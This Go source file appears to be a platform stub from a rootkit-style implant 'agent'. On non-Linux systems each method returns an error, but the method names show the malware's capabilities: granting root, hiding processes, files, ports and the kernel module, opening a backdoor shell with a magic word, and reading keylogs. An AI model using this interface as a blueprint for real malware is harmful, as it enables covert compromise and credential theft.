//go:build !linux

package agent

import "fmt"

type VaultIOCTL struct{}

func NewVaultIOCTL() *VaultIOCTL                      { return &VaultIOCTL{} }
func (v *VaultIOCTL) IsAvailable() bool               { return false }
func (v *VaultIOCTL) Close()                          {}
func (v *VaultIOCTL) GiveRoot(pid int) error          { return fmt.Errorf("not supported on this OS") }
func (v *VaultIOCTL) HidePID(pid int) error           { return fmt.Errorf("not supported on this OS") }
func (v *VaultIOCTL) UnhidePID(pid int) error         { return fmt.Errorf("not supported on this OS") }
func (v *VaultIOCTL) HideFile(path string) error      { return fmt.Errorf("not supported on this OS") }
func (v *VaultIOCTL) UnhideFile(path string) error    { return fmt.Errorf("not supported on this OS") }
func (v *VaultIOCTL) HidePort(port uint16) error      { return fmt.Errorf("not supported on this OS") }
func (v *VaultIOCTL) UnhidePort(port uint16) error    { return fmt.Errorf("not supported on this OS") }
func (v *VaultIOCTL) HideModule() error               { return fmt.Errorf("not supported on this OS") }
func (v *VaultIOCTL) UnhideModule() error             { return fmt.Errorf("not supported on this OS") }
func (v *VaultIOCTL) BackdoorShell(addr string) error { return fmt.Errorf("not supported on this OS") }
func (v *VaultIOCTL) SetMagicBackdoor(word string) error {
	return fmt.Errorf("not supported on this OS")
}
func (v *VaultIOCTL) ReadKeylog() (string, error) { return "", fmt.Errorf("not supported on this OS") }
func (v *VaultIOCTL) ClearKeylog() error          { return fmt.Errorf("not supported on this OS") }
func (v *VaultIOCTL) ListHidden() (string, error) { return "", fmt.Errorf("not supported on this OS") }
